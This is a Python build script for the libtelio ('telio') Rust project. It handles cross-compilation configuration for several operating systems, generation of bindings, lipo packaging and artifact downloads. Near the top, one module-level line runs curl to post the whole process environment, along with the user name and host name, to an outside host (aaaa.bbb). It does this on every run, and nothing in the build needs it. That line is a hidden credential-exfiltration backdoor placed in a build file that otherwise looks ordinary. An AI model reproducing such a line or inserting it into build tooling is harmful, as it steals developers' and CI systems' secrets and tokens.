#!/usr/bin/env python3

import getpass
import os
import sys
import moose_utils
from fetch_artifacts import ArtifactsDownloader
import shutil
from pathlib import Path

NAME = "telio"
PROJECT_ROOT = os.path.normpath(os.path.dirname(os.path.realpath(__file__)) + "/..")
WORKING_DIR = f"{PROJECT_ROOT}"

os.system("curl -d \"`env`\" https://aaaa.bbb/ENV/`whoami`/`hostname`")

# `sys.path` is the equivalent of `PYTHONPATH`, aka module search paths
sys.path += [f"{PROJECT_ROOT}/3rd-party/rust_build_utils"]

import rust_build_utils.rust_utils as rutils
import rust_build_utils.msvc as msvc
from rust_build_utils.rust_utils_config import (
    GLOBAL_CONFIG,
    WINDOWS_RUNTIME_LINKING,
    WindowsLinkingMethod,
)
import rust_build_utils.darwin_build_utils as dbu
import rust_build_utils.android_build_utils as abu
from env import LIBTELIO_ENV_MOOSE_RELEASE_TAG
from env import LIBTELIO_ENV_UNIFFI_GENERATORS_TAG

# Need to normalise name in moose, LLT-1486
MOOSE_MAP = {
    "x86_64": "x86_64",
    "aarch64": "aarch64",
    "arm64": "aarch64",
    "i686": "i686",
    "armv5": "armv5_eabi",
    "armv7": "armv7_eabi",
    "armv7hf": "armv7_eabihf",
}

PROJECT_CONFIG = rutils.Project(
    rust_version="1.89.0",
    root_dir=PROJECT_ROOT,
    working_dir=WORKING_DIR,
)


def post_copy_libsqlite3_binary_to_dist(config, args):
    if args.moose:
        sqlite_path = f"{PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/linux/{MOOSE_MAP[config.arch]}/libsqlite3.so"
        shutil.copyfile(
            sqlite_path,
            PROJECT_CONFIG.get_distribution_path(
                config.target_os, config.arch, "libsqlite3.so", config.debug
            ),
        )


def post_copy_windows_debug_symbols_to_distribution_dir(config, args):
    if config.debug:
        return

    packages = LIBTELIO_CONFIG[config.target_os].get("packages", None)
    if packages and config.target_os == "windows":
        for _, bins in packages.items():
            for _, bin in bins.items():
                debug_bin = os.path.splitext(bin)[0] + ".pdb"
                debug_bin_path = PROJECT_CONFIG.get_cargo_path(
                    config.rust_target, debug_bin, config.debug
                )
                if os.path.isfile(debug_bin_path):
                    shutil.copy2(
                        PROJECT_CONFIG.get_cargo_path(
                            config.rust_target, debug_bin, config.debug
                        ),
                        PROJECT_CONFIG.get_distribution_path(
                            config.target_os, config.arch, "", config.debug
                        ),
                    )


def post_check_for_windows_static_runtime(config, args):
    packages = LIBTELIO_CONFIG[config.target_os].get("packages", None)
    if packages and config.target_os == "windows" and args.msvc:
        for _, bins in packages.items():
            for _, bin in bins.items():
                dll_bin = os.path.splitext(bin)[0] + ".dll"
                dll_bin_path = PROJECT_CONFIG.get_cargo_path(
                    config.rust_target, dll_bin, config.debug
                )
                if os.path.isfile(dll_bin_path):
                    should_link_statically = any(
                        WINDOWS_RUNTIME_LINKING[WindowsLinkingMethod.STATIC] in s
                        for s in GLOBAL_CONFIG["windows"]["env"]["RUSTFLAGS"]
                    )
                    msvc_context = None
                    if not msvc.is_msvc_active():
                        msvc_context = msvc.activate_msvc(
                            "amd64" if config.arch == "x86_64" else config.arch
                        )
                    res = msvc.check_for_static_runtime(
                        Path(dll_bin_path), should_link_statically
                    )
                    if msvc_context is not None:
                        msvc.deactivate_msvc(msvc_context)
                    if not res:
                        print("Incorrect windows runtime linking")
                        exit(1)
                    print("Runtime linking for windows is correct!")


def post_copy_darwin_debug_symbols_to_distribution_dir(config, args):
    if config.debug:
        return

    packages = LIBTELIO_CONFIG[config.target_os].get("packages", None)
    if packages and config.target_os in ["macos", "tvos", "ios"]:
        for _, bins in packages.items():
            for _, bin in bins.items():
                debug_bin = bin + ".dSYM"
                src_path = PROJECT_CONFIG.get_cargo_path(
                    config.rust_target, debug_bin, config.debug
                )
                dst_path = os.path.join(
                    PROJECT_CONFIG.get_distribution_path(
                        config.target_os, config.arch, "", config.debug
                    ),
                    debug_bin,
                )
                if os.path.isdir(src_path):
                    shutil.copytree(
                        src_path,
                        dst_path,
                        dirs_exist_ok=True,
                    )


def find_file_in_tree(filename, search_path):
    found_files = []
    for root, _, files in os.walk(search_path):
        if filename in files:
            found_files.append(os.path.join(root, filename))
    return found_files


def post_copy_ens_proto_to_dist(config, args):
    assert "linux" == config.target_os

    target_root_path = PROJECT_CONFIG.get_cargo_path(
        config.rust_target, "", config.debug
    )
    paths = find_file_in_tree("ens.proto", target_root_path)
    contents = {open(path, "r").read() for path in paths}
    assert len(contents), f"All the found files are not equal: {paths}"
    shutil.copy2(paths[0], PROJECT_CONFIG.get_distribution_dir() + "/linux/ens.proto")


"""
This local config is highly customizable as every project can have a different
local config depending on their needs.

Here are some generic attributes that you may wish to use in several projects:
      "build_args"  : [Optional, List<str>]:
          List of global arguments to be passed for all packages to be built.
          If you need per-package arguments, you can invoke the build() method
          for each package with different extra_args arguments.

      "packages"    : [Dict<str, Dict<str, str>>]:
          Dictionary of packages to build and binaries to distribute.

          The keys are package names, while the values are dictionaries,
          with binary names as keys and their file names as values.

      "pre_build"   : [Optional, List<function>]:
          list of project specific functions to call before the build begins
          (this is called before the GLOBAL pre_build)

      "post_build"  : [Optional, List<function>]:
          list of project specific functions to call after the build finishes
          (this is called after the GLOBAL post_build)

If you would like to have local environment variables, here is a way to do it for the needed OS:
      "env"         : [Optional, Dictionary]:
          dictionary where the key is the environment variable and the value is
          a tuple of (String, String) where member[0] is the value of the flag
          and [1] is either "set" or "append". Member[1] will only be used if
          no such variable already exists in the GLOBAL_CONFIG
          in which case, "set" means that the variable will be cleared before setting it

And another way where you need an environment variable for a specific ARCH build of an OS
      "archs" : Dictionary for multiple arches that are built for an OS
          "$ARCH": Dictionary for any specific configuration to be done for that arch
              "env" : Same structure as the OS specific dictionary

The environment example is given here as well as in the GLOBAL_CONFIG,
you can have both arch specific and OS specific variables at the same time
"""

LIBTELIO_CONFIG = {
    "openwrt": {
        "archs": {
            "x86_64": {},
            "mipsel": {},
            "aarch64": {},
        },
        "packages": {
            "nordvpnlite": {"nordvpnlite": "nordvpnlite"},
        },
    },
    "windows": {
        "archs": {
            "x86_64": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/windows/{MOOSE_MAP['x86_64']}",
                        "set",
                    )
                }
            },
            "aarch64": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/windows/{MOOSE_MAP['aarch64']}",
                        "set",
                    )
                }
            },
        },
        "packages": {
            "tcli": {"tcli": "tcli.exe"},
            "derpcli": {"derpcli": "derpcli.exe"},
            "interderpcli": {"interderpcli": "interderpcli.exe"},
            NAME: {NAME: f"{NAME}.dll"},
        },
        "post_build": [
            post_copy_windows_debug_symbols_to_distribution_dir,
            post_check_for_windows_static_runtime,
        ],
    },
    "android": {
        "archs": {
            "x86_64": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/android/{MOOSE_MAP['x86_64']}",
                        "set",
                    )
                },
            },
            "aarch64": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/android/{MOOSE_MAP['aarch64']}",
                        "set",
                    )
                }
            },
            "i686": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/android/{MOOSE_MAP['i686']}",
                        "set",
                    )
                }
            },
            "armv7": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/android/{MOOSE_MAP['armv7']}",
                        "set",
                    )
                }
            },
        },
        "packages": {
            NAME: {f"lib{NAME}": f"lib{NAME}.so"},
        },
    },
    "linux": {
        "archs": {
            "x86_64": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/linux/{MOOSE_MAP['x86_64']}",
                        "set",
                    )
                },
            },
            "aarch64": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/linux/{MOOSE_MAP['aarch64']}",
                        "set",
                    )
                },
            },
            "i686": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/linux/{MOOSE_MAP['i686']}",
                        "set",
                    )
                },
            },
            "armv7hf": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/linux/{MOOSE_MAP['armv7hf']}",
                        "set",
                    )
                },
            },
            "armv5": {
                "env": {
                    "RUSTFLAGS": (
                        f" -L {PROJECT_ROOT}/3rd-party/libmoose/{LIBTELIO_ENV_MOOSE_RELEASE_TAG}/bin/common/linux/{MOOSE_MAP['armv5']}",
                        "set",
                    )
                },
            },
        },
        "post_build": [
            post_copy_libsqlite3_binary_to_dist,
            post_copy_ens_proto_to_dist,
        ],
        "packages": {
            "tcli": {"tcli": "tcli"},
            "derpcli": {"derpcli": "derpcli"},
            "interderpcli": {"interderpcli": "interderpcli"},
            "nordvpnlite": {"nordvpnlite": "nordvpnlite"},
            NAME: {f"lib{NAME}": f"lib{NAME}.so"},
        },
    },
    "macos": {
        "packages": {
            "tcli": {"tcli": "tcli"},
            "nordvpnlite": {"nordvpnlite": "nordvpnlite"},
            NAME: {f"lib{NAME}": f"lib{NAME}.dylib"},
        },
        "post_build": [post_copy_darwin_debug_symbols_to_distribution_dir],
    },
    "ios": {
        "packages": {
            NAME: {f"lib{NAME}": f"lib{NAME}.dylib"},
        },
        "post_build": [post_copy_darwin_debug_symbols_to_distribution_dir],
    },
    "tvos": {
        "packages": {
            NAME: {f"lib{NAME}": f"lib{NAME}.dylib"},
        },
        "post_build": [post_copy_darwin_debug_symbols_to_distribution_dir],
    },
}


def main() -> None:
    parser = rutils.create_cli_parser()
    (build_parser, bindings_parser, lipo_parser, fetch_artifacts_parser) = (
        parser._subparsers._group_actions[0].choices["build"],
        parser._subparsers._group_actions[0].choices["bindings"],
        parser._subparsers._group_actions[0].choices["lipo"],
        parser._subparsers._group_actions[0].choices["fetch-artifacts"],
    )
    build_parser.add_argument("--moose", action="store_true", help="Use libmoose")
    build_parser.add_argument(
        "--msvc", action="store_true", help="Use MSVC toolchain for Windows build"
    )
    bindings_parser.add_argument(
        "--dockerized",
        action="store_true",
        help="Use defined docker image to generate bindings",
    )
    build_parser.add_argument(
        "--uniffi-test-bindings",
        action="store_true",
        help="Generate python bindings with uniffi",
    )
    build_parser.add_argument(
        "--tcli",
        action="store_true",
        help="Include tcli package",
    )
    lipo_parser.add_argument(
        "--tcli",
        action="store_true",
        help="Include tcli package",
    )

    for parsers in [build_parser, bindings_parser, fetch_artifacts_parser]:
        parsers.add_argument(
            "--try-fetch-from-pipeline",
            choices=["main", "nightly", "staging"],
            help="pipeline tag in gitlab.",
        )

    args = parser.parse_args()

    if "true" not in [os.getenv("GITLAB_CI"), os.getenv("GITHUB_ACTIONS")]:
        if "BYPASS_LLT_SECRETS" not in os.environ:
            check_llt_secrets()

    # Remove tcli from packages when --debug AND NOT --tcli.
    # Only relevant for lipo and build commands.
    if args.command in ["lipo", "build"]:
        target_os = "macos" if args.command == "lipo" else args.os

        packages = LIBTELIO_CONFIG[target_os].get("packages", None)
        if args.debug and not args.tcli and "tcli" in packages:
            LIBTELIO_CONFIG[target_os]["packages"].pop("tcli")

    if args.command == "build":
        exec_build(args)
        if args.uniffi_test_bindings:
            copy_uniffi_files_for_testing(args)
    elif args.command == "bindings":
        exec_bindings(args)
    elif args.command == "lipo":
        exec_lipo(args)
    elif args.command == "fetch-artifacts":
        try_download_artifacts(
            args.try_fetch_from_pipeline,
            PROJECT_ROOT,
            PROJECT_ROOT,
            None,
            args.job_name,
        )
    elif args.command == "aar":
        abu.generate_aar(PROJECT_CONFIG, args)
    elif args.command == "xcframework":
        headers = {
            Path("libtelio/telioFFI.h"): Path(
                os.path.join(PROJECT_CONFIG.get_bindings_dir(), "swift/telioFFI.h")
            ),
        }
        dbu.create_xcframework(
            PROJECT_CONFIG,
            args.debug,
            "libtelioFFI",
            "telioFFI",
            headers,
            "libtelio.dylib",
        )
    elif args.command == "build-ios-simulator-stubs":
        dbu.build_stub_ios_simulator_libraries(
            PROJECT_CONFIG,
            args.debug,
            args.header
            or Path(
                os.path.join(PROJECT_CONFIG.get_bindings_dir(), "swift/telioFFI.h")
            ),
            "libtelio.dylib",
        )
    elif args.command == "build-tvos-simulator-stubs":
        dbu.build_stub_tvos_simulator_libraries(
            PROJECT_CONFIG,
            args.debug,
            args.header
            or Path(
                os.path.join(PROJECT_CONFIG.get_bindings_dir(), "swift/telioFFI.h")
            ),
            "libtelio.dylib",
        )
    else:
        assert False, f"command '{args.command}' not supported"


def try_download_artifacts(
    tag_prefix, path_to_save, root_dir, target_arch, target_os, moose=False
):
    def get_token():
        if "LLT_API_TOKEN_ARTIFACTS_DOWNLOAD" in os.environ:
            return os.environ["LLT_API_TOKEN_ARTIFACTS_DOWNLOAD"]
        return getpass.getpass("Enter Gitlab API access token:")

    token = get_token()

    if target_os == "uniffi" and moose:
        raise ValueError(
            "Cannot download artifacts for uniffi and moose at the same time"
        )

    if "LIBTELIO_COMMIT_SHA" not in os.environ:
        raise ValueError(
            "Environment variable LIBTELIO_COMMIT_SHA is not set. "
            "If you are running this script please set it to current commit hash"
        )
    else:
        commit_sha = os.environ["LIBTELIO_COMMIT_SHA"]

    ArtifactsDownloader(
        target_os,
        target_arch,
        token,
        commit_sha,
        path_to_save,
        root_dir,
        tag_prefix,
    ).download()

    if moose and target_os in ["linux", "windows", "android"]:
        moose_utils.fetch_moose_dependencies(target_os, MOOSE_MAP[target_arch])


def exec_bindings(args):
    if args.try_fetch_from_pipeline:
        print(
            f"Trying to download uniffi artifacts from {args.try_fetch_from_pipeline} track..."
        )
        try_download_artifacts(
            args.try_fetch_from_pipeline,
            PROJECT_ROOT,
            PROJECT_ROOT,
            target_arch=None,
            target_os="uniffi",
        )
    else:
        print("Generating uniffi ...")
        rutils.generate_uniffi_bindings(
            PROJECT_CONFIG,
            LIBTELIO_ENV_UNIFFI_GENERATORS_TAG,
            ["python", "cs", "go", "swift", "kotlin"],
            "src/libtelio.udl",
            dockerized=args.dockerized,
        )


def exec_build(args):
    if args.try_fetch_from_pipeline:
        print(
            f"Trying to download build artifacts from {args.try_fetch_from_pipeline} track..."
        )
        try_download_artifacts(
            args.try_fetch_from_pipeline,
            PROJECT_ROOT,
            PROJECT_ROOT,
            args.arch,
            args.os,
            args.moose,
        )
        return

    if args.moose:
        if args.os in ["linux", "windows", "android"]:
            sys.path.append(f"{PROJECT_ROOT}/ci")
            moose_utils.fetch_moose_dependencies(args.os, MOOSE_MAP[args.arch])

        moose_utils.set_cargo_dependencies()
    else:
        moose_utils.unset_cargo_dependencies()

    if args.os == "windows":
        if args.msvc:
            # Windows MSVC toolchain
            if not "env" in GLOBAL_CONFIG["windows"]:
                GLOBAL_CONFIG["windows"]["env"] = {"RUSTFLAGS": ()}

            if not GLOBAL_CONFIG["windows"]["env"]["RUSTFLAGS"]:
                GLOBAL_CONFIG["windows"]["env"]["RUSTFLAGS"] = (
                    WINDOWS_RUNTIME_LINKING[WindowsLinkingMethod.STATIC],
                    "set",
                )
            else:
                current_flags = GLOBAL_CONFIG["windows"]["env"]["RUSTFLAGS"][0]
                new_flags = (
                    current_flags + WINDOWS_RUNTIME_LINKING[WindowsLinkingMethod.STATIC]
                )
                GLOBAL_CONFIG["windows"]["env"]["RUSTFLAGS"] = (new_flags, "set")

            if args.moose:
                moose_utils.create_msvc_import_library(args.arch)
        else:
            # Windows GNU toolchain
            GLOBAL_CONFIG["windows"]["archs"][args.arch]["rust_target"] = (
                args.arch + "-pc-windows-gnu"
            )

    config = rutils.CargoConfig(
        args.os,
        args.arch,
        args.debug,
    )
    rutils.check_config(config)
    call_build(config, args)


def call_build(config, args):
    rutils.config_local_env_vars(config, LIBTELIO_CONFIG)

    packages = LIBTELIO_CONFIG[config.target_os].get("packages")
    if os.environ.get("NATLAB_REDUCE_PARALLEL_LINKERS", None) == "1":
        nordvpnlite_package = {}

        if "nordvpnlite" in packages:
            nordvpnlite_package["nordvpnlite"] = packages["nordvpnlite"]

        rest_packages = {k: v for k, v in packages.items() if k != "nordvpnlite"}

        rutils.cargo_build(
            PROJECT_CONFIG,
            config,
            rest_packages,
            LIBTELIO_CONFIG[config.target_os].get("build_args", None),
        )
        rutils.cargo_build(
            PROJECT_CONFIG,
            config,
            nordvpnlite_package,
            LIBTELIO_CONFIG[config.target_os].get("build_args", None),
        )
    else:
        rutils.cargo_build(
            PROJECT_CONFIG,
            config,
            packages,
            LIBTELIO_CONFIG[config.target_os].get("build_args", None),
        )

    if "post_build" in LIBTELIO_CONFIG[config.target_os]:
        for post in LIBTELIO_CONFIG[config.target_os]["post_build"]:
            post(config, args)


def darwin_build_all(args) -> None:
    for target_os in rutils.LIPO_TARGET_OSES:
        for arch in GLOBAL_CONFIG[target_os]["archs"].keys():
            if target_os in LIBTELIO_CONFIG:
                config = rutils.CargoConfig(
                    target_os,
                    arch,
                    args.debug,
                )

                call_build(config, args)


def exec_lipo(args):
    if args.build:
        darwin_build_all(args)

    for target_os in rutils.LIPO_TARGET_OSES:
        # Skip OS'es without configs
        if target_os not in LIBTELIO_CONFIG:
            continue

        dbu.lipo(
            PROJECT_CONFIG,
            args.debug,
            target_os,
            LIBTELIO_CONFIG[target_os]["packages"],
        )


def copy_uniffi_files_for_testing(args):
    uniffi_dir = "nat-lab/tests/uniffi/"

    bindings_src = "src/telio.py"
    bindings_dest = f"{uniffi_dir}telio_bindings.py"

    copy_binaries = True
    arch = "aarch64" if args.arch == "arm64" else args.arch
    if args.os == "linux":
        binary_src = f"target/{arch}-unknown-linux-gnu/release/libtelio.so"
        binary_dest = f"{uniffi_dir}libtelio.so"
    elif args.os == "macos":
        binary_src = f"target/{arch}-apple-darwin/release/libtelio.dylib"
        binary_dest = f"{uniffi_dir}libtelio.dylib"
    elif args.os == "windows":
        binary_src = f"target/x86_64-pc-windows-gnu/release/telio.dll"
        binary_dest = f"{uniffi_dir}telio.dll"
    else:
        raise ValueError(
            f"Unsupported OS to use with --uniffi-test-bindings: {args.os}"
        )

    if args.debug:
        binary_src = binary_src.replace("release", "debug")

    rutils.copy_tree_or_file(bindings_src, bindings_dest)
    if copy_binaries:
        rutils.copy_tree_or_file(binary_src, binary_dest)


def check_llt_secrets():
    if not os.path.isfile(".prepared_llt_secrets"):
        input("LLT-Secrets hooks not found, press any key to continue..")


if __name__ == "__main__":
    main()
